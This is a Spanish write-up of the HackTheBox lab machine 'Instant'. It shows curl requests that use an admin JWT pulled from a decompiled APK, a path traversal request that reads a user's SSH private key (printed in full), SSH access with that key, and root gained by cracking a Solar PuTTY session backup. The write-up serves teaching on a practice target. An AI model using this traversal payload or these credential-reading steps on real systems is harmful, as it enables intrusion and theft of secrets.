@@ -1,0 +1,329 @@
+---
+title: "Máquina Instant"
+description: "Resolución de la máquina Instant de HackTheBox"
+tags: ["Android", "REST", "Path traversal", "Solar PuTTY"]
+categories: ["HackTheBox", "Medium", "Linux"]
+logo: "/assets/writeups/instant/logo.webp"
+---
+
+Una aplicación de Android para wallets contiene información que filtra una API Interna junto a un token JWT para el usuario administrativo. Utilizaremos esto para enumerar la API y abusar de un AFR para acceder a la máquina.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+# Nmap 7.95 scan initiated Sat Oct 12 15:01:15 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 300 -vvv -n 10.10.11.37
+Nmap scan report for 10.10.11.37 
+Host is up, received user-set (0.31s latency).
+Scanned at 2024-10-12 15:01:15 -04 for 163s
+Not shown: 61012 closed tcp ports (reset), 4521 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Oct 12 15:03:58 2024 -- 1 IP address (1 host up) scanned in 163.06 seconds
+```
+
+El sitio web `instant.htb` nos dice que se trata de una aplicación para el manejo flexible y fácil de dinero:
+
+![Web](/assets/writeups/instant/1.png)
+
+Nos permite descargar un APK de android
+
+```bash
+❯ file ~/Downloads/instant.apk 
+/home/vzon/Downloads/instant.apk: Android package (APK), with gradle app-metadata.properties, with APK Signing Block
+```
+
+Veamos que le sacamos.
+
+## Intrusión
+
+### API Admin - mywalletv1.instant.htb
+
+Abriendo el APK en una herramienta como `jadx-gui`, podemos ver cosas jugosas:
+
+![APK](/assets/writeups/instant/2.png)
+
+El bytecode de `AdminActivities` contiene lo siguiente, transformado al equivalente en Java:
+
+```java
+package com.instantlabs.instant;
+
+import com.google.gson.JsonParser;
+import com.google.gson.JsonSyntaxException;
+import java.io.IOException;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+
+/* loaded from: classes.dex */
+public class AdminActivities {
+    private String TestAdminAuthorization() {
+        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
+            static final /* synthetic */ boolean $assertionsDisabled = false;
+
+            @Override // okhttp3.Callback
+            public void onFailure(Call call, IOException iOException) {
+                System.out.println("Error Here : " + iOException.getMessage());
+            }
+
+            @Override // okhttp3.Callback
+            public void onResponse(Call call, Response response) throws IOException {
+                if (response.isSuccessful()) {
+                    try {
+                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());
+                    } catch (JsonSyntaxException e) {
+                        System.out.println("Error Here : " + e.getMessage());
+                    }
+                }
+            }
+        });
+        return "Done";
+    }
+}
+```
+
+Si le hacemos una petición con cURL a esa URL con el token, funciona:
+
+```bash
+❯ curl -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" -v http://mywalletv1.instant.htb/api/v1/view/profile
+* Host mywalletv1.instant.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.37
+*   Trying 10.10.11.37:80...
+* Connected to mywalletv1.instant.htb (10.10.11.37) port 80
+* using HTTP/1.x
+> GET /api/v1/view/profile HTTP/1.1
+> Host: mywalletv1.instant.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Fri, 28 Feb 2025 14:31:51 GMT
+< Server: Werkzeug/3.0.3 Python/3.12.3
+< Content-Type: application/json
+< Content-Length: 236
+< 
+{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}
+```
+
+Parece que ya somos administradores en esta API REST, a alguien se le pasó que podiamos sacar el token simplemente decompilando la aplicación.
+
+### shirohige - instant
+
+Si comenzamos a pensar en posibles endpoints, podemos notar que `view/profile` indica una probabilidad de que las rutas estén estructuradas como `<action>/<object>`. Si probamos por el esquema `admin/<action>/<object>` usando de ejemplo `admin/view/logs`, obtenemos algo:
+
+```bash
+❯ curl -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" -v http://mywalletv1.instant.htb/api/v1/admin/view/logs
+* Host mywalletv1.instant.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.37
+*   Trying 10.10.11.37:80...
+* Connected to mywalletv1.instant.htb (10.10.11.37) port 80
+* using HTTP/1.x
+> GET /api/v1/admin/view/logs HTTP/1.1
+> Host: mywalletv1.instant.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
+> 
+* Request completely sent off
+< HTTP/1.1 201 CREATED
+< Date: Fri, 28 Feb 2025 14:33:54 GMT
+< Server: Werkzeug/3.0.3 Python/3.12.3
+< Content-Type: application/json
+< Content-Length: 64
+< 
+{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
+```
+
+Vale, con esto ya vamos creando una idea de como pueden ser otros endpoints... probando por `admin/read/log` ahora obtenemos esto:
+
+```bash
+❯ curl -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" -v http://mywalletv1.instant.htb/api/v1/admin/read/log
+* Host mywalletv1.instant.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.37
+*   Trying 10.10.11.37:80...
+* Connected to mywalletv1.instant.htb (10.10.11.37) port 80
+* using HTTP/1.x
+> GET /api/v1/admin/read/log HTTP/1.1
+> Host: mywalletv1.instant.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
+> 
+* Request completely sent off
+< HTTP/1.1 400 BAD REQUEST
+< Date: Fri, 28 Feb 2025 14:40:02 GMT
+< Server: Werkzeug/3.0.3 Python/3.12.3
+< Content-Type: application/json
+< Content-Length: 53
+< Connection: close
+< 
+{"Description":"Missing log file name","Status":400}
+* shutting down connection #0
+```
+
+Por lo que nos dice en la respuesta, podemos pensar en que el parámetro puede ser `log_file_name` y pues:
+
+```bash
+❯ curl -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" -v "http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log"
+* Host mywalletv1.instant.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.37
+*   Trying 10.10.11.37:80...
+* Connected to mywalletv1.instant.htb (10.10.11.37) port 80
+* using HTTP/1.x
+> GET /api/v1/admin/read/log?log_file_name=1.log HTTP/1.1
+> Host: mywalletv1.instant.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
+> 
+* Request completely sent off
+< HTTP/1.1 201 CREATED
+< Date: Fri, 28 Feb 2025 14:41:24 GMT
+< Server: Werkzeug/3.0.3 Python/3.12.3
+< Content-Type: application/json
+< Content-Length: 79
+< 
+{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}
+```
+
+Esto es vulnerable a Path Traversal:
+
+```bash
+❯ curl -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" -v "http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" 
+* Host mywalletv1.instant.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.37
+*   Trying 10.10.11.37:80...
+* Connected to mywalletv1.instant.htb (10.10.11.37) port 80
+* using HTTP/1.x
+> GET /api/v1/admin/read/log?log_file_name=../.ssh/id_rsa HTTP/1.1
+> Host: mywalletv1.instant.htb
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
+> 
+* Request completely sent off
+< HTTP/1.1 201 CREATED
+< Date: Fri, 28 Feb 2025 14:43:10 GMT
+< Server: Werkzeug/3.0.3 Python/3.12.3
+< Content-Type: application/json
+< Content-Length: 2809
+< 
+{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n","NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\n","nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\n","dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/\n","5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY\n","8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF\n","uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS\n","jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF\n","Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2\n","EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8\n","sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4\n","/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY\n","kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE\n","xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg\n","J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa\n","m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l\n","2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN\n","SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP\n","OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy\n","nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb\n","T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y\n","1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0\n","cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA\n","wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA\n","wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18\n","nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK\n","gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt\n","pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh\n","HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX\n","zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5\n","SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY\n","CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ\n","n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G\n","HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP\n","5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n","bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
+```
+
+Formateando esta llave privada y dándole los permisos correspondientes (600), ya tendremos acceso como el usuario `shirohige`
+
+```bash
+❯ /usr/bin/ssh -i id_rsa shirohige@10.10.11.37
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+shirohige@instant:~$
+```
+
+En su directorio personal encontraremos la primera flag.
+
+```bash
+shirohige@instant:~$ ls -al
+total 40
+drwxr-xr-x 7 shirohige shirohige 4096 Oct  4 15:22 .
+drwxr-xr-x 3 root      root      4096 Oct  4 15:22 ..
+lrwxrwxrwx 1 root      root         9 Aug  8  2024 .bash_history -> /dev/null
+lrwxrwxrwx 1 root      root         9 Aug  8  2024 .bash_logout -> /dev/null
+-rw-r--r-- 1 shirohige shirohige 3771 Aug  8  2024 .bashrc
+drwx------ 4 shirohige shirohige 4096 Oct  4 15:22 .cache
+drwxrwxr-x 3 shirohige shirohige 4096 Oct  4 15:22 .local
+lrwxrwxrwx 1 root      root         9 Aug  8  2024 .mysql_history -> /dev/null
+-rw-r--r-- 1 shirohige shirohige  807 Aug  8  2024 .profile
+lrwxrwxrwx 1 root      root         9 Aug 10  2024 .python_history -> /dev/null
+drwx------ 2 shirohige shirohige 4096 Oct  4 15:22 .ssh
+lrwxrwxrwx 1 root      root         9 Aug  8  2024 .viminfo -> /dev/null
+drwxrwxr-x 2 shirohige shirohige 4096 Oct  4 15:22 logs
+drwxrwxr-x 3 shirohige shirohige 4096 Oct  4 15:22 projects
+-rw-r----- 1 root      shirohige   33 Feb 28 10:08 user.txt
+shirohige@instant:~$ cat user.txt
+9a127d8b683be1cdb9092058e6******
+```
+
+## Escalada de privilegios
+
+En `/opt/backups/Solar-PuTTY` hay un backup de algo extraño:
+
+```bash
+shirohige@instant:/opt/backups/Solar-PuTTY$ ls -la
+total 12
+drwxr-xr-x 2 shirohige shirohige 4096 Oct  4 15:22 .
+drwxr-xr-x 3 shirohige shirohige 4096 Oct  4 15:22 ..
+-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 sessions-backup.dat
+```
+
+El programa Solar PuTTY es un fork del viejo y conocido PuTTY, un programa para conectarse a servidores SSH. Es similar a MobaXTerm en cuanto a carácteristicas profesionales que ofrece.
+
+Buscando información sobre la estructura de estos archivos de sesión, nos encontramos con el [siguiente articulo](https://hackmd.io/@tahaafarooq/cracking-solar-putty) que nos da información sobre como el programa trata estos archivos de sesión (están encriptados con 3DES), y nos cuenta sobre como programó una herramienta para desencriptar estos archivos que [podemos ver acá](https://github.com/VoidSec/SolarPuttyDecrypt)
+
+Pero viendo como está programado, podemos percatarnos de que esta herramienta solamente desencripta el archivo si la contraseña es válida o usa la DPAPI de Windows. No está diseñado para funcionar con wordlists que es lo que necesitamos. Yo [edité la herramienta original](https://github.com/Vz0n/SolarPuttyBrute) y le agregué esa funcionalidad que le faltaba, asi que usaré mi versión personalizada.
+
+Estando en Windows con el archivo ya, podemos ejecutar el programa así como se muestra a continuación y nos devolverá una credencial junto con la contraseña utilizada para encriptar el archivo:
+
+![Cracked](/assets/writeups/instant/3.png)
+
+Esta contraseña es válida para el usuario root:
+
+```bash
+shirohige@instant:~$ su
+Password: 
+root@instant:/home/shirohige#
+```
+
+Con esto ya podremos tomar la última flag.
+
+```bash
+root@instant:/home/shirohige# cd 
+root@instant:~# ls -la
+total 36
+drwx------  5 root root 4096 Feb 28 10:08 .
+drwxr-xr-x 23 root root 4096 Oct  4 15:26 ..
+lrwxrwxrwx  1 root root    9 Aug  8  2024 .bash_history -> /dev/null
+lrwxrwxrwx  1 root root    9 Aug  8  2024 .bash_logout -> /dev/null
+-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
+drwx------  3 root root 4096 Oct  4 15:22 .cache
+drwxr-xr-x  3 root root 4096 Oct  4 15:22 .local
+lrwxrwxrwx  1 root root    9 Aug  8  2024 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Apr 22  2024 .profile
+lrwxrwxrwx  1 root root    9 Aug 10  2024 .python_history -> /dev/null
+drwx------  2 root root 4096 Aug  8  2024 .ssh
+lrwxrwxrwx  1 root root    9 Aug  8  2024 .viminfo -> /dev/null
+-rw-r--r--  1 root root  165 Oct  4 15:41 .wget-hsts
+-rw-r-----  1 root root   33 Feb 28 10:08 root.txt
+root@instant:~# cat root.txt
+605c2864e2457606e34dbd9547******
+```
+
+## Extra
+
+A pesar de que hayamos pensado bien las rutas de la API del inicio, dentro del APK había una URL que nos llevaba a un Swagger con toda la documentación de dicha API (swagger-ui.instant.htb):
+
+![API docs](/assets/writeups/instant/4.png)
+
+
